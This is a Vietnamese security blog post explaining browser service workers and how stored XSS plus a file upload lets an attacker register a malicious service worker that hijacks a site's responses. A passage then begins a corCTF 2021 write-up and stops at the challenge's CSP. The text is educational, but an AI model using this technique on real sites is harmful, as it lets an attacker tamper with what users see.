<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Service worker v√† Man-in-the-Middle Attack" /><meta name="author" content="to^" /><meta property="og:locale" content="en" /><meta name="description" content="M·ªôt d·∫°ng client side attack" /><meta property="og:description" content="M·ªôt d·∫°ng client side attack" /><link rel="canonical" href="https://to016.github.io//posts/SWandMITM/" /><meta property="og:url" content="https://to016.github.io//posts/SWandMITM/" /><meta property="og:site_name" content="to^" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-05-10T23:43:00+07:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Service worker v√† Man-in-the-Middle Attack" /><meta name="twitter:site" content="@nguyendt0" /><meta name="twitter:creator" content="@to^" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"to^"},"dateModified":"2022-05-21T04:43:20+07:00","datePublished":"2022-05-10T23:43:00+07:00","description":"M·ªôt d·∫°ng client side attack","headline":"Service worker v√† Man-in-the-Middle Attack","mainEntityOfPage":{"@type":"WebPage","@id":"https://to016.github.io//posts/SWandMITM/"},"url":"https://to016.github.io//posts/SWandMITM/"}</script><title>Service worker v√† Man-in-the-Middle Attack | to^</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="to^"><meta name="application-name" content="to^"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /assets/img/avatar.jpeg " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">to^</a></div><div class="site-subtitle font-italic">Student, CTFer, web warrior</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/to016" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/nguyendt0" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['todinhnguyen1610','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Service worker v√† Man-in-the-Middle Attack</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1000 400'%3E%3C/svg%3E" data-src="/assets/img/SWandMITM/cyber.jpg" class="preview-img bg" alt="cyber image" width="1000" height="400" data-proofer-ignore><h1 data-toc-skip>Service worker v√† Man-in-the-Middle Attack</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/nguyendt0">T√¥ ƒê·ªânh Nguy√™n</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1652200980" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-05-10 </em> </span> <span> Updated <em class="timeago" data-ts="1653083000" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-05-20 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2175 words"> <em>12 min</em> read</span></div></div></div><div class="post-content"><p><em>Service worker v√† Man-in-the-Middle Attack</em>, ƒë·ªÉ hi·ªÉu r√µ ƒë∆∞·ª£c v·ªÅ ch√∫ng th√¨ m√¨nh s·∫Ω chia ra t·ª´ng ch·ªß ƒë·ªÉ nh·ªè v√† cu·ªëi c√πng s·∫Ω m·ªôt challenge CTF t·ª´ nƒÉm 2021 ƒë·ªÉ minh h·ªça.</p><h2 id="service-worker-sw-l√†-g√¨-"><span class="mr-2">Service worker (SW) l√† g√¨ ?</span><a href="#service-worker-sw-l√†-g√¨-" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="ho√†n-c·∫£nh-ra-ƒë·ªùi"><span class="mr-2">Ho√†n c·∫£nh ra ƒë·ªùi</span><a href="#ho√†n-c·∫£nh-ra-ƒë·ªùi" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>C√°c tr√¨nh duy·ªát web s·ª≠ d·ª•ng Javascript nh∆∞ m·ªôt ng√¥n ng·ªØ ƒë·ªÉ x·ª≠ l√≠ c√°c ƒëo·∫°n code b√™n ph√≠a user, n·∫øu html l√† khung s∆∞·ªùn c·ªßa trang web, css gi√∫p t√¥ ƒëi·ªÉm cho trang web th√¨ JS g√≥p ph·∫ßn l√†m cho trang web tr·ªü n√™n sinh ƒë·ªông h∆°n, t∆∞∆°ng t√°c h∆°n v·ªõi user. Javascript l√† m·ªôt ‚Äúsingle threaded language‚Äù, c√≥ nghƒ©a l√† n√≥ th·ª±c thi c√°c ƒëo·∫°n code theo th·ª© t·ª± v√† ch·ªâ khi xong ƒëo·∫°n code ph√≠a tr∆∞·ªõc th√¨ m·ªõi ƒë·∫øn c√°i ti·∫øp theo.</p><p>M·ªói tab trong m·ªôt tr√¨nh duy·ªát web s·∫Ω t∆∞∆°ng ·ª©ng v·ªõi m·ªôt JS thread. V√† b·ªüi v√¨ n√≥ l√† single thread n√™n n·∫øu c√°c t√°c v·ª• ph·∫£i x·ª≠ l√≠ qu√° nhi·ªÅu tr√™n m·ªôt thread nh∆∞ v·∫≠y s·∫Ω d·∫´n ƒë·∫øn thread n√†y b·ªã blocked v√† t·∫•t nhi√™n s·∫Ω l√†m ·∫£nh h∆∞·ªõng ƒë·∫øn perfomance c·ªßa trang web ƒë√≥. Service workers (SW) ra ƒë·ªùi ƒë√£ gi·∫£i quy·∫øt ƒë∆∞·ª£c v·∫•n ƒë·ªÅ n√†y</p><h3 id="service-worker"><span class="mr-2">Service worker</span><a href="#service-worker" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>SW ch·ªâ ƒë∆°n gi·∫£n l√† m·ªôt t·ªáp JS. M·ªôt ƒëi·ªÉm ƒë·ªÉ ph√¢n bi·ªát gi·ªØa SW v√† m·ªôt file JS th√¥ng th∆∞·ªùng ƒë√≥ l√† SW th√¨ ch·∫°y trong n·ªÅn v√† ƒëi·ªÅu n√†y c≈©ng g√≥p ph·∫ßn l√†m gi·∫£m ƒëi c√°c t√°c v·ª• ph·∫£i x·ª≠ l√≠ cho JS thread ƒë√£ n√≥i ·ªü tr√™n. SW cung c·∫•p c√°c t√≠nh nƒÉng kh√¥ng y√™u c·∫ßu giao di·ªán ho·∫∑c t∆∞∆°ng t√°c v·ªõi ng∆∞·ªùi d√πng ch·∫≥ng h·∫°n nh∆∞ ƒë·ªìng b·ªô ng·∫ßm v√† <a href="https://viblo.asia/p/web-push-notification-maGK7J695j2">push notifications</a> ‚Ä¶</p><p>SW ƒë√≥ng vai tr√≤ nh∆∞ m·ªôt proxy gi·ªØa web application v√† network, v√¨ th·∫ø m√† n√≥ c√≥ th·ªÉ intercept requests v√† x·ª≠ l√≠ ch√∫ng.</p><p><img data-src="/assets/img/SWandMITM/sw.png" alt="service worker" data-proofer-ignore> <em>service worker</em></p><h2 id="v√≤ng-ƒë·ªùi-c·ªßa-service-worker"><span class="mr-2">V√≤ng ƒë·ªùi c·ªßa service worker</span><a href="#v√≤ng-ƒë·ªùi-c·ªßa-service-worker" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p><img data-src="https://res.cloudinary.com/scotch/image/upload/v1536590617/kxhshgxmbcl1aw7gncem.png" alt="SW life cycle" data-proofer-ignore> <em>SW life cycle</em></p><p>V√≤ng ƒë·ªùi c·ªßa m·ªôt service worker bao g·ªìm 3 giai ƒëo·∫°n ch√≠nh:</p><ol><li>Registration<li>Installtion<li>Activation</ol><p>Tr∆∞·ªõc khi b·∫Øt ƒë·∫ßu s·ª≠ d·ª•ng m·ªôt service worker ta ph·∫£i ƒëƒÉng k√≠ cho n√≥ nh∆∞ m·ªôt background process. ƒêo·∫°n code minh h·ªça cho vi·ªác ƒëƒÉng k√≠ m·ªôt SW:</p><div class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="k">if</span> <span class="p">(</span><span class="dl">'</span><span class="s1">serviceWorker</span><span class="dl">'</span> <span class="k">in</span> <span class="nb">navigator</span><span class="p">)</span> <span class="p">{</span>
    <span class="nb">navigator</span><span class="p">.</span><span class="nx">serviceWorker</span><span class="p">.</span><span class="nx">register</span><span class="p">(</span><span class="dl">'</span><span class="s1">/sw.js</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span>
        <span class="na">scope</span><span class="p">:</span> <span class="dl">'</span><span class="s1">/blog/</span><span class="dl">'</span>
    <span class="p">})</span>
    <span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="kd">function</span> <span class="p">(</span><span class="nx">registration</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">Service worker registered!</span><span class="dl">'</span><span class="p">);</span>
    <span class="p">})</span>
    <span class="p">.</span><span class="k">catch</span><span class="p">(</span><span class="kd">function</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">Registration failed!</span><span class="dl">'</span><span class="p">);</span>
    <span class="p">})</span>
<span class="p">}</span>
</pre></table></code></div></div><p>B·ªüi v√¨ kh√¥ng h·∫≥n l√† tr√¨nh duy·ªát n√†o c≈©ng h·ªó tr·ª£ SW n√™n ta s·∫Ω ph·∫£i ki·ªÉm tra trong <code class="language-plaintext highlighter-rouge">if</code>.</p><p>B√™n c·∫°nh ƒë√≥ ta c≈©ng c√≥ th·ªÉ ch·ªâ ƒë·ªãnh <code class="language-plaintext highlighter-rouge">scope</code> cho n√≥. <code class="language-plaintext highlighter-rouge">Scope</code> l√† m·ªôt kh√°i ni·ªám quan tr·ªçng trong SW, n√≥ ch·ªâ ƒë·ªãnh path m√† SW n√†y s·∫Ω ho·∫°t ƒë·ªông. Trong v√≠ d·ª• tr√™n <code class="language-plaintext highlighter-rouge">scope</code> ƒë∆∞·ª£c set l√† <code class="language-plaintext highlighter-rouge">/blog/</code> c√≥ nghƒ©a ta ƒë√£ gi·ªõi h·∫°n v√πng ho·∫°t ƒë·ªông c·ªßa SW ch·ªâ trong trong ph·∫°m vi c·ªßa th∆∞ m·ª•c <code class="language-plaintext highlighter-rouge">/blog/</code>.</p><p>M·ªôt v√†i ƒëi·ªÅu c·∫ßn l∆∞u √Ω v·ªÅ giai ƒëo·∫°n n√†y nh∆∞ sau:</p><ul><li>SW mu·ªën ƒë∆∞·ª£c load th√¨ ph·∫£i th·ªèa m√£n t√≠nh ch·∫•t same origin.<li>N·∫øu kh√¥ng c·∫•u h√¨nh <code class="language-plaintext highlighter-rouge">scope</code> th√¨ gi√° tr·ªã m·∫∑c ƒë·ªãnh c·ªßa n√≥ l√† ƒë∆∞·ªùng d·∫´n c·ªßa file JS trong <code class="language-plaintext highlighter-rouge">register()</code>.</ul><p>Sau khi ho√†n th√†nh ƒëƒÉng k√≠, server s·∫Ω t·∫£i worker n√†y v√†o background. V√† ngay sau khi n√≥ ƒë∆∞·ª£c t·∫£i xu·ªëng, SW nh·∫≠n s·ª± ki·ªán<code class="language-plaintext highlighter-rouge">activate</code> , th∆∞·ªùng c√°c l·∫≠p tr√¨nh vi√™n s·∫Ω d√πng n√≥ ƒë·ªÉ kh·ªüi t·∫°o c√°c file tƒ©nh v√†o trong cache. K·∫ø ƒë√≥, SW ti·∫øn v√†o trang th√°i <code class="language-plaintext highlighter-rouge">idle</code> v√† quy·∫øt ƒë·ªãnh tr·∫°ng th√°i k·∫ø ti·∫øp s·∫Ω l√† g√¨. Ho·∫∑c l√† s·∫Ω <code class="language-plaintext highlighter-rouge">terminated</code> ƒë·ªÖ ti·∫øt ki·ªám b·ªô nh·ªõ ho·∫∑c l√† s·∫Ω x·ª≠ l√≠ c√°c requests b·∫±ng s·ª± ki·ªán <code class="language-plaintext highlighter-rouge">fetch</code>/<code class="language-plaintext highlighter-rouge">message</code>. T·∫•t c·∫£ c√°c requests thu·ªôc ph·∫°m vi ƒë√£ c·∫•u h√¨nh trong <code class="language-plaintext highlighter-rouge">scope</code> s·∫Ω ƒë∆∞·ª£c x·ª≠ l√≠.</p><p>Code minh h·ªça cho vi·ªác c·∫•u h√¨nh s·ª± ki·ªán <code class="language-plaintext highlighter-rouge">fetch</code> trong sw.js nh∆∞ sau:</p><div class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="nb">self</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="dl">'</span><span class="s1">fetch</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">event</span><span class="p">.</span><span class="nx">respondWith</span><span class="p">(</span><span class="nx">caches</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">request</span><span class="p">))</span>
    <span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="kd">function</span> <span class="p">(</span><span class="nx">response</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nx">response</span> <span class="o">||</span> <span class="nx">fetch</span><span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">request</span><span class="p">);</span>
    <span class="p">});</span>
<span class="p">});</span>
</pre></table></code></div></div><p>N·∫øu m·ªôt SW ƒë∆∞·ª£c ƒëƒÉng k√≠ th√¨ trang web v·∫´n s·∫Ω ∆∞u ti√™n x·ª≠ d·ª•ng c√°i c≈© v√† ƒë∆∞a c√°i m·ªõi v√†o <code class="language-plaintext highlighter-rouge">waiting</code> sate. M·ªôt khi trang web ƒë√≥ng ho·∫∑c ƒë∆∞·ª£c reload th√¨ SW m·ªõi ƒë∆∞·ª£c n·∫°p v√†o s·ª≠ d·ª•ng. ƒêi·ªÉm n√†y n√™n ƒë∆∞·ª£c ch√∫ √Ω khi mu·ªën th·ª±c hi·ªán m·ªôt cu·ªôc t·∫•n c√¥ng Man-in-the-Middle Attack.</p><h2 id="man-in-the-middle-attack-mitm-l√†-g√¨-"><span class="mr-2">Man-in-the-Middle Attack (MITM) l√† g√¨ ?</span><a href="#man-in-the-middle-attack-mitm-l√†-g√¨-" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>H·ªìi x∆∞a khi ƒëi h·ªçc ch·∫Øc h·∫≥n ai c≈©ng ƒë√£ t·ª´ng nh·∫≠n v√† ƒë∆∞a th∆∞ gi√πm cho m·∫•y ƒë·ª©a trong l·ªõp ƒë√∫ng kh√¥ng. H·ªìi ƒë√≥ m√¨nh c√≤n ch·ªânh s·ª≠a l·∫°i th∆∞ c·ªßa ch√∫ng n√≥ c∆° üòú. Ki·ªÉu t·∫•n c√¥ng n√†y c≈©ng t∆∞∆°ng t·ª± d·ª±a tr√™n c√°i v√≠ d·ª• m√† m√¨nh ƒë∆∞a ra ƒë√≥. N√≥i m·ªôt c√°ch ‚Äúsecurity‚Äù h∆°n v·ªÅ kh√°i ni·ªám c·ªßa n√≥ th√¨ MITM l√† m·ªôt ki·ªÉu t·∫•n c√¥ng b√≠ m·∫≠t x·∫£y ra khi attacker nh·∫£y v√†o m·ªôt phi√™n giao ti·∫øp gi·ªØa user ho·∫∑c h·ªá th·ªëng. Attacker s·∫Ω m·∫°o danh c·∫£ hai b√™n v√† c√≥ ƒë∆∞·ª£c quy·ªÅn truy c·∫≠p v√†o th√¥ng tin m√† hai b√™n ƒëang c·ªë g·∫Øng g·ª≠i cho nhau. Attacker c√≥ th·ªÉ ch·∫∑n, g·ª≠i v√† nh·∫≠n d·ªØ li·ªáu d√†nh cho c·∫£ hai b√™n, m√† kh√¥ng c√≥ b√™n n√†o bi·∫øt cho ƒë·∫øn khi qu√° mu·ªôn.</p><h2 id="m·ªëi-li√™n-h·ªá-gi·ªØa-sw-v√†-mitm"><span class="mr-2">M·ªëi li√™n h·ªá gi·ªØa SW v√† MITM</span><a href="#m·ªëi-li√™n-h·ªá-gi·ªØa-sw-v√†-mitm" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>T·ªõi ƒë√¢y c√≥ th·ªÉ b·∫°n s·∫Ω th·∫Øc m·∫Øc ‚Äúth·∫ø th√¨ MITM li√™n quan c√°i qu√°i g√¨ ƒë·∫øn service worker ü§® ???‚Äù</p><p>M√¨nh s·∫Ω ƒë∆∞a ra m·ªôt v√≠ ƒë·ª• d∆°n gi·∫£n:</p><ul><li>Gi·∫£ s·ª≠ m·ªôt trang web b√°n h√†ng b·ªã l·ªói stored XSS ·ªü ph·∫ßn comment v√† c√≥ ch·ª©c nƒÉng upload file.<li>User mu·ªën ƒë·ªçc tin t·ª©c v·ªÅ s·∫£n ph·∫©m hay mu·ªën xem profile c√° nh√¢n th√¨ c·∫ßn truy c·∫≠p t·ªõi <code class="language-plaintext highlighter-rouge">http://shopping.com/products</code>, <code class="language-plaintext highlighter-rouge">http://shopping.com/profile</code>.<li>T√≠nh nƒÉng upload s·∫Ω l∆∞u file c·ªßa user t·∫°i ƒë∆∞·ªùng d·∫´n <code class="language-plaintext highlighter-rouge">http://shopping.com/uploads/&lt;filename&gt;</code>.<li>Stored XSS x·∫£y ra ·ªü ph·∫ßn comment c·ªßa c√°c s·∫£n ph·∫©m.</ul><p>K·ªãch b·∫£n t·∫•n c√¥ng s·∫Ω nh∆∞ sau:</p><ul><li>Attacker s·∫Ω upload 1 file SW - <code class="language-plaintext highlighter-rouge">sw.js</code>.<li>·ªû ph·∫ßn comment c·ªßa s·∫£n ph·∫©m d√πng JS ƒë·ªÉ ƒëƒÉng k√≠ SW <code class="language-plaintext highlighter-rouge">register(http://shopping.com/uploads/sw.js)</code>.<li>Trong file <code class="language-plaintext highlighter-rouge">sw.js</code> n√†y c·∫•u h√¨nh <code class="language-plaintext highlighter-rouge">scope: '/'</code> v√† s·ª± ki·ªán <code class="language-plaintext highlighter-rouge">fetch</code> tr·∫£ v·ªÅ reponse <code class="language-plaintext highlighter-rouge">YOU ARE HACKED</code>.</ul><p>M·ªôt khi user ·∫•n v√†o ƒë·ªÉ xem comment c·ªßa s·∫£n ph·∫©m th√¨ v√¥ t√¨nh trigger ƒë·ªëng JS code -&gt; register SW -&gt; pwned. L√∫c n√†y khi user mu·ªën xem profile hay th√¥ng tin s·∫£n ph·∫©m th√¨ th·ª© hi·ªÉn th·ªã ch·ªâ l√† d√≤ng ch·ªØ <code class="language-plaintext highlighter-rouge">YOU ARE HACKED</code> c·ªßa attacker üòà.</p><p>·ªû ƒë√¢y m√¨nh ch·ªâ ƒë∆∞a ra v√≠ d·ª• v·ªÅ ‚ÄúResponse modification‚Äù c√°c b·∫°n c√≥ th√™m xem th√™m t·∫°i <a href="https://www.akamai.com/blog/security/abusing-the-service-workers-api">ƒë√¢y</a>.</p><p>Qua v√≠ d·ª• ƒë∆°n gi·∫£n n√†y ta c√≥ th·ªÉ th·∫•y vi·ªác attacker l·ª£i d·ª•ng service woker, ho·∫°t ƒë·ªông nh∆∞ m·ªôt proxy, v√† k·∫øt h·ª£p v·ªõi MITM ƒë·ªÉ th·ª±c hi·ªán m·ªôt cu·ªôc t·∫•n c√¥ng ph√≠a ng∆∞·ªùi d√πng.</p><hr /><h2 id="blogme---corctf2021"><span class="mr-2">blogme - corCTF2021</span><a href="#blogme---corctf2021" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Challenge n√†y l√† m·ªôt c√°ch ƒë·ªÉ th·ª±c t·∫ø h√≥a ƒë·ªëng l√≠ thuy·∫øt n√£y gi·ªù. M√¨nh c≈©ng s·∫Ω ti·∫øn h√†nh ph√¢n t√≠ch h∆∞·ªõng gi·∫£i quy·∫øt cho n√≥ d·ª±a tr√™n tinh th·∫ßn h·ªçc h·ªèi t·ª´ t√°c gi·∫£ l√† ch√≠nh.</p><h3 id="source-code"><span class="mr-2"><em>Source code</em></span><a href="#source-code" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p><a href="https://github.com/strellic/my-ctf-challenges/tree/main/corCTF-2021">https://github.com/strellic/my-ctf-challenges/tree/main/corCTF-2021</a></p><h3 id="overview"><span class="mr-2"><em>Overview</em></span><a href="#overview" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p><img data-src="/assets/img/SWandMITM/overview.png" alt="overview" data-proofer-ignore> <em>overview</em></p><p>Trang web hi·ªÉn th·ªã m·ªôt v√†i post c·ªßa admin v√† c√≥ c√°c ch·ª©c nƒÉng nh∆∞ <code class="language-plaintext highlighter-rouge">Profile</code>, <code class="language-plaintext highlighter-rouge">Your Posts</code>, <code class="language-plaintext highlighter-rouge">Logout</code>, <code class="language-plaintext highlighter-rouge">Comment</code>.</p><ul><li><p><code class="language-plaintext highlighter-rouge">Profile</code>: t·∫°o post, upload image file v√† c√≥ th·ªÉ d√πng ƒë·ªÉ set avatar. <img data-src="/assets/img/SWandMITM/profile.png" alt="profile" data-proofer-ignore> <em>profile</em></p><li><code class="language-plaintext highlighter-rouge">Your Posts</code>: hi·ªÉn th·ªã c√°c post ƒë√£ t·∫°o. <img data-src="/assets/img/SWandMITM/your_posts.png" alt="your posts" data-proofer-ignore> <em>your posts</em><li><code class="language-plaintext highlighter-rouge">Comment</code>: b√¨nh lu·∫≠n v·ªÅ m·ªôt post b·∫±ng c√°ch g·ª≠i data t·ªõi <code class="language-plaintext highlighter-rouge">../api/comment/&lt;post id&gt;</code>. <img data-src="/assets/img/SWandMITM/comment.png" alt="comment" data-proofer-ignore> <em>comment</em></ul><h3 id="ph√¢n-t√≠ch"><span class="mr-2"><em>Ph√¢n t√≠ch</em></span><a href="#ph√¢n-t√≠ch" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>HTML b·ªã escaped ·ªü t·∫•t c·∫£ c√°c ch·ªó ngo·∫°i tr·ª´ post page. Nh∆∞ng t√°c gi·∫£ c√≥ d√πng CSP:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>object-src 'none';
script-src 'self' 'unsafe-eval';
